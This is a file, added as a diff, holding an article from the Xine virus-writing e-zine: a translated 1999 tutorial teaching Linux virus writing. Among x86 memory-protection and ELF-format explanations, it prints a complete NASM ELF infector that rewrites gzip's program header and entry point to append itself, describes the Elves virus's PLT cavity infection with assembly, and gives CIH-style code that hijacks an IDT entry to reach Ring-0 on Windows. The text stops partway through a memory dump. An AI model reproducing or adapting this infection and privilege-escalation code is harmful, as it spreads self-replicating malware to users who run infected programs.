@@ -1,0 +1,1685 @@
+
+
+                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                             ³ Xine - issue #5 - Phile 105 ³
+                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+
+
+
+ Viruses under LiNUX
+ ============================================================================
+
+ Index
+ ~~~~~
+ 1. Introduction
+        1.1 Foreword by Billy Belcebu
+        1.2 Original Author Introduction
+ 2. ELF Infection
+ 3. Resident viruses
+        3.1 Global residency in Ring-0
+        3.2 Global residency in Ring-3
+        3.3 PerProcess residency
+
+ NOTE: This article was made using kernel version 2.0.34, where the segment
+       distribution is different from the actual kernel versions like 2.2.XX.
+
+
+ Introduction
+ ------------
+
+ 1. Foreword by Billy Belcebu
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Hi, and welcome to the worlds' first ever Virus Writing Guide alike for the
+ LiNUX system. This tutorial is NOT written by me, and my only intention is
+ to translate it to all the viral community in general. If you want to take a
+ look to the original version (that is in spanish) you can find it on my own
+ website (http://beautifulpeople.cjb.net).
+
+ The author, who wants to remain anonymous, has shown impressive LiNUX skills
+ and aswell a good assembler level (rare for a LiNUX coder), but he has a
+ problem with his lack of optimization ;)
+
+ My conclussions after reading this article are various: LiNUX kicks ass,
+ LiNUX kicks Windoze's ass... You can take a look to its heavy and very
+ intelligent protection: It's almost impossible to achieve Ring-0 (at least
+ not being root), it's impossible to make a Ring-3 global residence (with the
+ impressive mechanism of copy-on-write), and all those details that makes
+ the LiNUX system to be the best choice actually in matter of operative sys-
+ tems. Really. 
+
+ My english is not very good, but seems that i'm the only one that wants to
+ take the trouble to translate this. Besides, i think that leave this jewel
+ only in spanish is an unforgivable sin. So, here i am, translating it 4 u ;)
+
+ Enjoy!
+
+ (c) 1999 Mr Anonymous [ Original Article ]
+ (c) 1999 Billy Belcebu/iKX [ Translation ]
+
+ PS: I have the author permission for this. Don't blame me with copyrightz...
+
+
+ 2. Introduction: Memory protection
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ The neverending question, Why aren't viruses for linux?. It seems that the
+ viral community, accustomed to Real Mode systems (DOS), find that is hard to
+ adapt themselves to protected mode systems. Even for Win95/98, systems with
+ important dessign problems, there exists moreless 30 viruses where the great
+ majority are non-resident viruses or VxD infectors (Ring-0 devices).
+
+ It seems that the answer is in the important memory protection implemented
+ by Linux.
+
+ Systems like Win95/NT use a memory dessign with a limited use of segments.
+ In this systems with user and kernel selectors, we can directionate all the
+ virtual space, i.e. from 0x00000000 to 0xFFFFFFFF (That doesn't means that
+ you can write to all the memory, because the memory pages also have some
+ protection attributes).
+
+ However in Linux the dessign is very different, there are two different
+ zones very differenced by segmentation, one dedicated to user processes,
+ that go from 0x00000000 to 0xC0000000 and other for the kernel, that go from
+ 0xC0000000 to 0xFFFFFFFF.
+
+ Let's see a dump of registers with GDB, taken from the beginning of the
+ execution of a command like GZIP.
+         
+ 
+        (gdb)info registers
+
+        eax           0x0        0
+        ecx           0x1        1
+        edx           0x0        0          
+        ebx           0x0        0
+        ebp           0xbffffd8c     0xbffffd8c
+        esi           0xbffffd9c     0xbffffd9c
+        edi           0x4000623c     1073766972
+        eip           0x8048b10      0x8048b10
+        eflags        0x296          662
+        cs            0x23           35
+        ss            0x2b           43
+        ds            0x2b           43           
+        es            0x2b           43
+        fs            0x2b           43
+        gs            0x2b           43
+
+
+ We can see that Linux uses the selector 0x23 for code, and the selector 0x2B
+ for the data. Intel uses 16-bit selectors, the two less significan bits
+ store the RPL (information about the privilege level of that selector, 
+ Intel implements 4 protection rings, but the actual operative systems like
+ Win95/NT or Linux use only 2, Ring-0 for the kernel (maximum privilege
+ level) and Ring-3 for the user processes)). The next bit shows where is the
+ descriptor of the segment that contains information about the segment, 0 for
+ the GDT (GLOBAL DESCRIPTOR TABLE) or 1 for the LDT (LOCAL DESCRIPTOR TABLE).
+ The other bits are simply an index of a segment descriptor that will be in
+ the LDT or the GDT according to the information of below.
+
+ Selector [ 14 bits, Index to descriptor ] [ 1 bit, GDT/LDT ] [ 2 bits, RPL ]
+
+ Then, if we pass to binary 0x23 we got
+
+          [ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 ] [ 0 ] [ 1 1 ]
+
+ So we know that it is a Ring-3 selector (it's used by a process) and also we
+ know that tge information of such segment lies in the GDT, at 4th entry.
+ If we analyze the next descriptor (0x2B) we'll obtain a similar information,
+ but the descriptor will be at 5th entry.
+
+ If we take a look to the kernel's code, more concretly in the file called
+ /usr/src/linux/arch/i386/kernel/head.S (painfully in assembler :)) we can
+ appreciate the segment initialization in linux.
+
+
+/*
+ * This gdt setup gives the kernel a 1GB address space at virtual
+ * address 0xC0000000 - space enough for expansion, I hope.
+ */
+
+ENTRY(gdt)
+	.quad 0x0000000000000000	/* NULL descriptor */
+	.quad 0x0000000000000000	/* not used */
+	.quad 0xc0c39a000000ffff	/* 0x10 kernel 1GB code at 0xC0000000 */
+	.quad 0xc0c392000000ffff	/* 0x18 kernel 1GB data at 0xC0000000 */
+	.quad 0x00cbfa000000ffff	/* 0x23 user   3GB code at 0x00000000 */
+	.quad 0x00cbf2000000ffff	/* 0x2b user   3GB data at 0x00000000 */
+	.quad 0x0000000000000000	/* not used */
+	.quad 0x0000000000000000	/* not used */
+	.fill 2*NR_TASKS,8,0		/* space for LDT's and TSS's etc */
+#ifdef CONFIG_APM
+	.quad 0x00c09a0000000000	/* APM CS    code */
+	.quad 0x00809a0000000000	/* APM CS 16 code (16 bit) */
+	.quad 0x00c0920000000000	/* APM DS    data */
+#endif
+
+
+ As you can see, Linux initializes 4 segments: 2 for kernel and 2 for user,
+ depending if they are of code or data. In each entry is stored information
+ like the base address of the segment and its limit, if it's resident in
+ memory or not, the kind of segment, if its code is in 16 or 32 bits.
+ Meanwhile there are an user selector in the DS segment, we can't ever handle
+ an address over 0xC0000000 because we would be out of the memory that can
+ be accessed by the segment, we would receive a SIGSEGV signal and our
+ process would be finished painfully.
+
+ I know i can directionate from 0x00000000 to 0xC0000000 but, what can i
+ modify?. Here begins the real protection mechanism. The memory is divided in
+ pages of 4Kb each one in the case of Intel, and each page has its own
+ attributes: if they are read/write, if it's in memory (it can be at disk
+ temporally), if it's of kernel, etc.
+
+ All the information about pages in memory is located in a page table that
+ contains descriptors for each mapped page in memory. There is one page table
+ for each process in memory, this makes that each process has its own virtual
+ space and besides, that any other process could access to another one.
+
+ This makes possible to load programs in the same memory address, and really
+ it's what it does. Windows 95/98 and Linux do it. In Linux the usual load
+ address is 0x08040000 while in Windows it is 0x00400000.
+
+ This page table is pointed by a control register of the processor (the CR3)
+ so it changes with each change of context modifying also the virtual space
+ of the process.
+
+ But then, if a process can only handle directionate the perprocess memory,
+ how is it able to execute system calls that reside over 0xC0000000? Intel
+ brings us mechanisms for jump to Ring-0 in a safe way when we need to make
+ system calls. Intel uses two methods: the TRAP GATES and the CALL GATES.
+ Usually are used the TRAP GATES (WinNT/98/95, Linux); even i believe that
+ some other unix systems use the CALL GATES for make the Ring jump.
+
+ The Trap Gates occupy one entry in the IDT (INTERRUPT DESCRIPTOR TABLE), and
+ allow the jump to Ring-0 with the generation of one interrupt. For that, the
+ jump address defined in the IDT must have a Ring-0 selector and the DPL
+ (Descriptor Privilege Level) must be 3, allowing an user to execute it. In
+ Linux the interrupt used for the jump is the 0x80, while Win95 uses the int
+ 0x30, for example.
+
+ Let's see the disassembly of the getpid function of the LIBC library. For
+ that we create a C file like this:
+
+ #include <unistd.h>
+
+ void main()
+        {
+                getpid();        /* I get the PID of the process */
+        }
+
+ After compile it, we debug the binary file with GDB:
+
+        (gdb)disass
+
+        0x8048480 <main>:        pushl %ebp
+        0x8048481 <main+1>:      movl  %esp,%ebp
+        0x8048483 <main+3>:      call  0x8048378 <getpid>
+        0x8048488 <main+8>:      movl  %ebp,%esp
+        0x804848a <main+13>:     popl  %ebp
+        0x804848b <main+11>:     ret
+
+ As you can see the call to getpid is dessigned in Linux (and in other
+ systems) as a CALL to a special section inside the binary file (0x8048378).
+ There we could find a jump to the desired library function. This jumps are
+ built in memory by the OS for choose the dynamic links with the libraries.
+ With this, any file could execute exported functions of others, if it's
+ pointed in this way by the information in the ELF header. Let's continue
+ debugging:
+
+        (gdb)disass getpid
+
+        0x40073000 <__getpid>:   pushl %ebp 
+        0x40073001 <__getpid+1>: movl  %esp,%ebp
+        0x40073003 <__getpid+3>: pushl %ebx
+        0x40073004 <__getpid+4>: movl  $0x14,%eax
+        0x40073009 <__getpid+9>: int   $0x80   
+
+ These are the first instructions of the getpid library call. Its work is
+ simple: we are only preparing a jump to Ring-0. If the function would have
+ some parameters, it would have prepared the registers for that parameters
+ before doing the jump to Ring-0. It would have put in EAX the number of
+ function, and it would have called to the int 0x80. As you can see, the code
+ of the libraries is in the PerProcess memory, below 0xC0000000, so it's
+ Ring-3 code and it lacks of privileges for access ports,to privileged memory
+ areas, etc. That's the reason because the libraries are really intermediary
+ between the calls made by the processes and the calls generated via int 0x80
+
+ All the system calls that need to jump to Ring-0 will use the int 0x80, and
+ the int 0x80 has only a descriptor, we'll jump always to the same memory
+ address. That makes us to need to put in EAX register the number of the
+ function we want to call to. In Ring-0, the kernel evaluates the value of
+ EAX for know what function if has to satisfy, and according to its value, it
+ would jump to one function or to another using an internal table of pointers
+ to function called sys_call_table. The list of function accedped with the
+ int 0x80 is in the file /usr/include/sys/syscall.h
+
+ With the execution of an int 0x80 the processor will change the selector
+ of code active. It'll change from the selector 0x23 to 0x10, so we'll pass
+ from directionate from 0x00000000-0xC0000000 to 0xC0000000-0xFFFFFFFF.
+
+ The next method of jump, rarely used, is based in an entry in the GDT or
+ excepcionally in the LDT. There we'll define what's denominated a CALL GATE,
+ that allows jumps to Rings of more privilege via the instruction CALL FAR or
+ JUMP FAR of assembler.
+
+
+
+ ELF infection
+ -------------
+
+ In Linux there are two formats of executables: a.out and ELF; however every
+ executable and library of Linux nowadays use the second format. The ELF
+ format is very powerful, and contains information for handle applications
+ under different processors. It contains information about the processor
+ where the executable was compiled, or if it has to use little endian or big
+ endian. As it is a format of processors in extended mode, besides the
+ information about the physical sections that are in the file, there is some
+ information about how the OS has to map the file in memory.
+
+ The ELF file has one first part that occupies the first 0x24 bytes of the
+ executable, and contains, among other things, a mark 'ELF' for show us that
+ it is an executable file with ELF format; the kind of processor, the base
+ address (that is the virtual address of the first instruction that will be
+ executed in the file) and after, 2 pointers to 2 tables.
+
+ The first table pointed is the Program Header (located physically after the
+ ELF header) that contains entries with information about how will be mapped
+ in memoy the file. Each entry will contain the size of each segment in the
+ memory and in the file, also the address of the init of the segment.
+
+ The next table is the Section Header, and it's just at the end of the file.
+ It'll contain information about each logical section, it'll also contain
+ protection attributes, but this information won't be used for map the code
+ of the file in memory.
+
+ With the GDB command 'maintenance info sections' we can see the section
+ structure with all the protection attributes of each section. If you take a
+ look at it, you'll realize that all the readonly sections are situated the
+ first ones, and the read/write sections, altogether at the end. This is
+ necessary because the code sections are mapped altogether in memory in
+ consecutive pages by means of an entry in the program header. That's why all
+ the section that share the same protection attributes will be able to share
+ memory pages, meanwhile the sections with different attributes won't be able
+ to do so. With this we avoid the internal fragmentation in the executables,
+ because if every section would have to map separately, the last page of
+ every section would be empty, and many space would be wasted.
+
+ Also look to the last readonly page doesn't share a page with the first one
+ with readwrite attributes. The dump of this instruction with a command like
+ gzip would be the following:
+
+
+ (gdb)maintenance info sections
+ Exec file:
+ '/bin/gzip', file type elf32-i386.
+ 0x080480d4->0x080480e7 at 0x000000d4: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x080480e8->0x08048308 at 0x000000e8: .has ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048308->0x08048738 at 0x00000308: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048738->0x08048956 at 0x00000738: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048998->0x08048b08 at 0x00000958: .rel.bss ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08048b10->0x08048b18 at 0x00000b10: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08048b18->0x08048e08 at 0x00000b18: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08048e10->0x08050dac at 0x00000e10: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08050db0->0x08050db8 at 0x00008db0: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
+ 0x08050db8->0x08051f25 at 0x00008db8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
+ 0x08052f28->0x08053960 at 0x00009f28: .data ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053960->0x08053968 at 0x0000a960: .ctors ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053968->0x08053968 at 0x0000a968: .dtors ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053970->0x08053a34 at 0x0000a970: .got ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053a34->0x08053abc at 0x0000aa34: .dynamic ALLOC LOAD DATA HAS_CONTENTS
+ 0x08053abc->0x080a4078 at 0x0000aabc: .bss ALLOC
+ 0x00000000->0x00000178 at 0x0000aabc: .comment READONLY HAS_CONTENTS
+ 0x00000178->0x000002b8 at 0x0000ac34: .note READONLY HAS_CONTENTS
+
+
+ Take a look to that curious jump between .rodata and .data sections caused
+ by all that i exposed before. This command allows you to visialize how will
+ be in memory the program, but its information in not important for its load.
+ We won't even need to modify the section header for insert more executable
+ code in the file. The Program Header is the true informer of the load
+ process. It contains 5 entries, but it's possible to insert more.
+
+ - The first one loads the program header.
+ - The second one is a reference to an string with the routine and the name
+   of the interpreter that will be the library that will create in memory the
+   image of the process (usually ld-linux-so.1).
+ - The third one loads every readonly sections, all those found in the first
+   entries of the Section Header.
+ - The fourth loads all the read/write sections
+ - The fifth loads the .dynamic section needed for the dynamic link process.
+
+ So one solution for insert more executable code could be the expanding of
+ the data segment. This is problematic, because if we copy all the viric code
+ to the end of the executable, i.e. just after the section header, and we
+ expand the entry of the Program Header that corresponds with the data
+ segment, the viral code would overwrite one logical section of the archive,
+ the .bss section. As we had seen with the gdb dump, the .bss section is the
+ last one that is part of the space of the process, and contains the ALLOC
+ attribute, however it doesn't contains the LOAD attribute, so it doesn't
+ load data from the file. This is caused by the fact that the .bss section
+ contains uninitialized data (still) by the host code. If the viric code is
+ mapped over that section is not very problematic, because the virus will be
+ executed before the infected host, so after the virus execution, the host
+ wouldn't care about it. This section, at load time, if filled of zeroes, so
+ a bad programming, like suppose an uninitialized variable set to 0, would
+ show the presence of the virus. In any case,the virus can avoid this copying
+ itself to any other memory address, and filling its old position in .bss
+ with zeroes.
+
+ Another possibility could be to create another entry in the program header,
+ but we would have to shift almost all the archive, and this would take too
+ much infection time.
+
+;****************************************************************************
+;                      Linux ELF file infection
+;****************************************************************************
+; Compile with:
+;            nasm -f elf hole.asm -o hole.o
+;            gcc hole.o -o hole
+
+        [section .text]
+
+        [global main]
+
+hoste:
+        ret
+
+main:  
+        pusha                                   ; Beginning of the virus
+                                                ; Push all the parameters
+        call    getdelta
+getdelta:
+        pop     ebp
+        sub     ebp,getdelta       
+                               
+        mov     eax,125                         ; I modify the attributes with
+        lea     ebx,[ebp+main]                  ; mprotect for write in protec-
+                                                ; ted pages
+        and     ebx,0xFFFFF000                  ; Round up to pages
+        mov     ecx,03000h                      ; r|w|x attributes
+        mov     edx,07h                         ; We will only need this in 
+        int     80h                             ; the 1st gen, because we'll
+                                                ; copy us in the data section
+        mov     ebx,01h
+        lea     ecx,[ebp+texto]
+        mov     edx,0Ch                         ; Show a Hello World with a 
+        call    sys_write                       ; write to stdout
+    
+        mov     eax,05
+        lea     ebx,[ebp+archivo]               ; open file to infect (./gzip)
+        mov     ecx,02                          ; read/write
+        int     80h
+        mov     ebx,eax                         ; Handle in EBX
+	 
+        xor     ecx,ecx
+        xor     edx,edx                         ; Go to beginning of file
+        call    sys_lseek
+       
+        lea     ecx,[ebp+Elf_header]            ; Read the ELF header to our
+        mov     edx,24h                         ; variable
+        call    sys_read
+                 
+        cmp     word [ebp+Elf_header+8],0xDEAD  ; Check for previous infection
+        jne     infectar
+        jmp     salir
+infectar:
+        mov     word [ebp+Elf_header+8],0xDEAD
+                                                ; The mark is on the 2 first
+                                                ; fill bytes in the ident struc
+
+        mov     ecx,[ebp+e_phoff]               ; e_phoff is a ptr to the PH
+        add     ecx,8*4*3                       ; Obtain 3rd entry of data seg
+        push    ecx
+        xor     edx,edx
+        call    sys_lseek                       ; Go to that position
+           
+        lea     ecx,[ebp+Program_header]        ; Read the entry
+        mov     edx,8*4                   
+        call    sys_read
+                
+        add     dword [ebp+p_filez],0x2000      ; increase segment size in
+        add     dword [ebp+p_memez],0x2000      ; memory and in the file
+              
+; The size to add must be superior to the size of the virus, because besides
+; copy the virus, we have also to copy the section table, located before
+; and it is not mapped into mem by default. It could be shifted (for avoid
+; copying it) but for simplycity reasons i don't do that.
+
+        pop     ecx
+        xor     edx,edx
+        call    sys_lseek                       ; back to entry position
+         
+        lea     ecx,[ebp+Program_header]
+        mov     edx,8*4
+        call    sys_write                       ; Write entry to the file
+
+        xor     ecx,ecx
+        mov     edx,02h
+        call    sys_lseek                       ; Go to file end
+
+; EAX = File Size, that will be phisical offset of the virus
+     
+        mov     ecx,dword [ebp+oldentry]
+        mov     dword [ebp+temp],ecx
+
+        mov     ecx,dword [ebp+e_entry]
+        mov     dword [ebp+oldentry],ecx
+
+        sub     eax,dword [ebp+p_offset]
+        add     dword [ebp+p_vaddr],eax
+        mov     eax,dword [ebp+p_vaddr]         ; EAX = New entrypoint
+    
+        mov     dword [ebp+e_entry],eax
+       
+; These are the calculations of the new entry address, that will point to the
+; code of the virus. For calculate the virtual address of the virus in memory
+; i move the pointer to the end of the file with lseek, so the EAX register
+; will have the phisical size of the file (i.e. the physical position of the
+; virus in the file).
+; If to that position i substract the physical position of the beginning of
+; the data segment, i will have the virus position relative to the beginning
+; of the data segment, and if i add to it the virtual address of the segment
+; i will obtain the virtual address of the virus in memory.
+
+        lea     ecx,[ebp+main]
+        mov     edx,virend-main
+        call    sys_write                       ; Write the virus to the end
+
+
+        xor     ecx,ecx
+        xor     edx,edx
+        call    sys_lseek                       ; Set pointer to beginning of
+                                                ; the file
+        lea     ecx,[ebp+Elf_header]
+        mov     edx,24h
+        call    sys_write                       ; Modify header with new EIP
+
+        mov     ecx,dword [ebp+temp]
+        mov     dword [ebp+oldentry],ecx
+                 
+salir:  mov     eax,06                          ; Close the file
+        int     80h
+        popa
+ 
+        db      068h                            ; Opcode of a PUSH
+oldentry:
+        dd      hoste                           ; back to infected program
+        ret
+
+        
+sys_read:                                       ; EBX = Must be File Handle
+        mov     eax,3
+        int     80h
+        ret
+sys_write:                                      ; EBX = Must be File Handle
+        mov     eax,4
+        int     80h
+        ret
+sys_lseek:                                      ; EBX = Must be File Handle
+        mov     eax,19
+        int     80h
+        ret
+
+dir     dd      main
+        dw      010h 
+archivo db      "./gzip",0                      ; File to infect
+datos   db      00h  
+
+temp    dd      00h                             ; Save oldentry temporally
+
+;**************** Data Zone *************************************************
+
+newentry        dd 00h                          ; New virii EIP
+newfentry       dd 00h
+myvaddr         dd 00h
+texto           db 'HELLO WORLD',0h
+
+Elf_header:
+e_ident:     db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h           
+e_type:      db 00h,00h
+e_machine:   db 00h,00h
+e_version:   db 00h,00h,00h,00h
+e_entry:     db 00h,00h,00h,00h
+e_phoff:     db 00h,00h,00h,00h
+e_shoff:     db 00h,00h,00h,00h 	 
+e_flags:     db 00h,00h,00h,00h
+e_ehsize:    db 00h,00h
+e_phentsize: db 00h,00h
+e_phnum:     db 00h,00h
+e_shentsize: db 00h,00h
+e_shnum:     db 00h,00h
+e_shstrndx:  db 00h,00h			
+jur:         db 00h,00h,00h,00h
+
+Program_header:
+p_type       db 00h,00h,00h,00h
+p_offset     db 00h,00h,00h,00h
+p_vaddr      db 00h,00h,00h,00h
+p_paddr      db 00h,00h,00h,00h        
+p_filez      db 00h,00h,00h,00h
+p_memez      db 00h,00h,00h,00h
+p_flags      db 00h,00h,00h,00h
+p_align      db 00h,00h,00h,00h
+         
+Section_entry:
+sh_name      db 00h,00h,00h,00h 
+sh_type      db 01h,00h,00h,00h
+sh_flags     db 03h,00h,00h,00h      ;alloc
+sh_addr      db 00h,00h,00h,00h
+sh_offset    db 00h,00h,00h,00h
+sh_size      dd (virend-main)*2
+sh_link      db 00h,00h,00h,00h
+sh_info      db 00h,00h,00h,00h
+sh_addralign db 01h,00h,00h,00h
+sh_entsize   db 00h,00h,00h,00h
+
+
+virend:
+
+;****************************************************************************
+
+ If we execute this in a directory where is the gzip file, we will obtain the
+ following message in the screen:
+
+ HELLO WORLD
+
+ If we execut the gzip, we will obtain this:
+
+ HELLO WORLDgzip: compressed data not written to a terminal. Use -f to force compression.
+ For help, type:gzip -h
+
+ As you can see,the viral code is executed before the host, and after that it
+ returns to it the control without any kind of dificulty.
+
+ However there are other methods that allow the infection without expanding
+ any section of the Program Header. The Staog virus and the Elves virus use
+ alternative methods.
+
+ Staog, for example, overwrites the entrypoint of the host with the code of
+ the virus, and the overwritten code is copied to the end of the host. The
+ virus, when receives the control at the execution moment, opens the file
+ (for know the name it takes a look in the stack),takes the code of the virus
+ and make a temporal file in the /tmp directory. After doing that, it calls
+ to fork and while an execution thread is executing the viral code of the
+ temporal archive by meand of execve, other execution thread copies that code
+ to the stack of the program and give the control to that code, that will
+ rebuild the code of the host, and return the control to the original entry-
+ point.
+
+ Elves, however, made by Super of the group 29A, uses a method much more
+ advanced that makes perprocess residency, and avoids that the infected files
+ grow up in size (cavity infection).
+
+ NOTE: For more information about perprocess residecy and the structure and
+       use of the PLT, take a look to the article of perprocess residency.
+
+ The method consists in introduce the viral code in the PLT. The PLT is a
+ necessary structure of the executable that allows the dynamic link of the
+ functions. For that it doesn't move the PLT to other part of the executable
+ or anything similar, the viral code overwrites it, but it continues working
+ perfectly.
+
+ As i will explain in the article about PerProcess residency, there're 2 ways
+ to make a call to a library: by means of the dynamic linker (when we don't
+ know what's the address of the function), or directly with a specific entry
+ for that function in the PLT (when we've already obtained in the GOT the
+ address). After Elves infection, the second method is disabled, and all the
+ calls are made by means of the dynamic linker. The virus overwrites from the
+ second entry, leaving untouched the first one (the one that makes the jump
+ to the dynamic linker).
+
+ As we can see in the article about PerProcess residency, an entry in the PLT
+ has the following form:
+
+        jmp     *address_of_GOT
+        pushl   entry_in_reloc                  ; Necessary for the D.L. for
+        jmp     first_PLT_entry                 ; know what function needs
+
+ As you can see, it's not a very optimized code, the first jump would occupy
+ 5 bytes, the push other 5 bytes, and the next jump another 5 bytes, so the
+ entry would have 15 bytes. So the virus is divided in blocks of 15 bytes,
+ and this allows a sequential execution of the code in a normal way, but in
+ the case that  we try to make a jump to the beginning of a PLT entry, it
+ would found a jmp previous_PLT_entry codified only with 2 bytes, with the
+ opcodex 0xEB, 0xEE.
+
+ Let's see an example:
+
+
+virus_start:	
+fake_plt_entry1:
+	pushl %eax
+	pushal
+	call get_delta
+
+get_delta:	
+	popl %edi
+        enter $Stat_size,$0x0
+        movl (Pushl+Pushal+Pushl)(%ebp),%eax
+
+.byte 0x83
+fake_plt_entry2:	
+.byte 0xeb,0xee
+
+        leal -0x7(%edi),%esi
+	addl -0x4(%eax),%eax
+        subl %esi,%eax
+        shrl %eax
+        movl %eax,(Pushl+Pushal)(%ebp)
+
+.byte 0x83                 ; If we execute sequentially this code, we will
+fake_plt_entry3:           ; execute the opcodes 0x83,0xEB,0xDE as if it was
+.byte 0xeb,0xde            ; an only one opcode, so we would execute the 
+                           ; opcode sub ebx,-22
+                           ; But if we make a system call, this jumps to the
+                           ; 3rd entry of the PLT. The processor would find 
+                           ; the opcodes 0xEB,0xDE, that is the opcode of a
+                           ; jmp fake_plt_entry2
+ 
+ By means of that, when a jump to any PLT entry is done, the execution thread
+ would find miraculously 0xEB opcodes, that will go making little jumps until
+ the virus_start label. From here, the virus will be execute sequentially
+ garbage opcodes like sub ebx,-22 that really are hiding a jmp PLT_entry, and
+ after trying to infect the first call to each system call, it makes a jump
+ to the first PLT entry, so it jumps to the dynamic linker.
+
+ I received the source code of this virus for test it, and painfully, in my
+ Linux version it is not functional (Debian 2.0.34). This is because Super,
+ with his needs of optimizing in space the virus, makes the following code
+ for push the reloc entry and avoid to put a push each entry (that would have
+ make him to break the virus in fragments even smaller):
+
+; This is a generic code for push the entry in the reloc section
+             
+        movl (Pushl+Pushal+Pushl)(%ebp),%eax
+                                ; in EAX the return value of CALL imm
+        leal -0x7(%edi),%esi    ; in ESI the offset to the beginning of PLT
+        addl -0x4(%eax),%eax    ; in EAX the value of the immediate
+        subl %esi,%eax          ; Substract the two values
+        shrl %eax               ; in EAX i will have the reloc entry
+        movl %eax,(Pushl+Pushal)(%ebp) ; Push the new value
+
+ The dynamic linker need entries in the .reloc.plt section for know what
+ address it needs to resolve. For that, it supposes that the consecutive
+ entries of the PLT will have consecutive entries in the .reloc.plt section,
+ and if fact, that's true. If we take a look to any PLT, the compiler puts in
+ the first PLT a PUSH 0x00, in the second PLT a PUSH 0x08, in the third a
+ PUSH 0x10, and so on. This is not really a problem, the real problem is to
+ suppose that all the calls to the PLT are done with a CALL immediate (being
+ the immediate a 4 bytes value). When we do a CALL in assembler,the processor
+ pushes the return address on the stack (i.e. the address of the next ins-
+ truction of the call). The virus, as we can see, reads from the stack that
+ value, substracts to it a 4 (the size of the immediate) and reads the value
+ pointed by that address (the next code after the call). To that value, it
+ substracts the PLT address, so we obtain the difference of bytes of the PLT
+ entry we've called to, and the beginning of the PLT, and with that value, it
+ obtains the entry value in the reloc section with a simple rotation opcode.
+ This method is okay if we only make calls with the opcode CALL immediate.
+ This might be true, for example in the newest Linux versions,but for example
+ my Linux version makes jumps to the PLT of the host only with the opcode
+ CALL *EBP, also this instruction is not codifies in host's code, it's done
+ by the dynamic linker even before the host takes the control (i still don't
+ know why).
+
+ Anyway this method is very interesting and useful.
+
+
+
+ Resident Viruses
+ ----------------
+
+ 1. Global residency in Ring-0
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ The resident viruses in Ring-0 are those that achieve maximum privileges in
+ the processor, and already in Ring-0 they hook the system calls made by all
+ the processes of the system.
+
+ For achieve Ring-0 an user process should try to make various things: it
+ could try to modify the IDT for generate a TRAP GATE, modify the GDT or the
+ LDT for generate a CALL GATE, or even patch code in Ring-0, so as our code
+ would receive the execution thread already in Ring-0. Wihtout any doubt, it
+ seems a hard work, because all those structures are or should be protected
+ by the OS.
+
+ But in systems like Windows 95, where code like this (used by the CIH virus)
+ allows us to jump to Ring-0 without difficulty:
+
+;****************************************************************************
+
+        .586p
+        .model  flat,STDCALL
+
+extrn   ExitProcess:PROC
+
+        .data
+
+idtaddr dd      ?,?
+
+        .code
+
+;************* Start of code for achieve Ring-0 *************
+
+startvirii:
+
+        sidt    qword ptr [idtaddr]     ; Obtain limit and address of the IDT
+         
+        mov     ebx,dword ptr [idtaddr+2h] ; in EBX the base
+        add     ebx,8d*5d               ; Modify int 5 cause i'm gonna use its
+                                        ; IDT entry
+        lea     edx,[ring0code]         ; in EDX goes the ring0code offset   
+        push    word ptr [ebx]          ; Modify IDT entry offset for make
+        mov     word ptr [ebx],dx       ; the jump to ring0code when the int
+        shr     edx,16d                 ; 5h is executed
+        push    word ptr [ebx+6]
+        mov     word ptr [ebx+6],dx
+
+        int     5h                      ; Generate the exception
+
+        mov     ebx,dword ptr [idtaddr+2h] ; Resotre entry offset of the IDT
+        add     ebx,8d*5h
+        pop     word ptr [ebx+6]                   
+        pop     word ptr [ebx]
+        
+        push    -1
+        call    ExitProcess
+
+ring0code:
+        pushad
+                                        ; Code executed under Ring-0
+
+        popad
+
+exit_r0:
+        iretd
+        
+        
+
+endvirii:                   
+
+end:
+        end     startvirii
+
+;****************************************************************************
+
+
+ What makes possible that this code works in Windows? The answer is simple,
+ firstly Windows can directionate with user selectors the kernel memory, also
+ (and besidess it seems incredible) lacks of protection by pagination in
+ addresses superior to 0xC0000000, that lies, as linux, the code executed in
+ Ring-0.
+
+ So if we can directionate the IDT memory, and also we can write there, the
+ jump to Ring-0 is easy. In this example we have chosen the int 0x05 because
+ it is already a TRAP GATE in Windows,that's why we only modify the IDT entry
+ and instead jump to the memory address assigned by windows, it would jump
+ to our label ring0code inside the perprocess memory of our process.
+
+ However,in Linux we can't directionate the user memory with Ring-0 selectors
+ so we couldn't do the jump in case that we could directionate the kernel
+ memory and the pagination protection would be deactivated, the modification
+ of the IDT wouldn't be enough. If we modify the int 0x5 entry of the IDT for
+ generate a TRAP GATE, we wouldn't be able to use the Ring-0 selector of
+ Linux (0x10). In the IDT we would find the address 0x10:ring0code for make
+ the jump, but that address doesn't point to the PerProcess memory; in fact
+ the base address of the 0x10 segment is 0xC0000000, really we would be
+ jumping to the address 0xC0000000+ring0code.
+
+ Let's see where lies the IDT in Linux. Compile the next code with NASM:
+
+        [extern puts]
+        [global main]
+        [SECTION .text]
+
+main:   sidt    [datos]         ; Put in datos var the IDT address
+        nop
+        sgdt    [datos]         ; Put in datos var the GDT address
+        nop
+        sldt    [datos]         ; Put in datos var the LDT address
+        nop
+        ret
+      
+        [SECTION .data]
+
+data_   dd      0x0,0x0
+
+ Executing this step by step, and reading the value stores in 'data_', we get
+ the following memory dumps. (0x80495ED = address of 'data_' variable):
+
+        Dump after SIDT
+
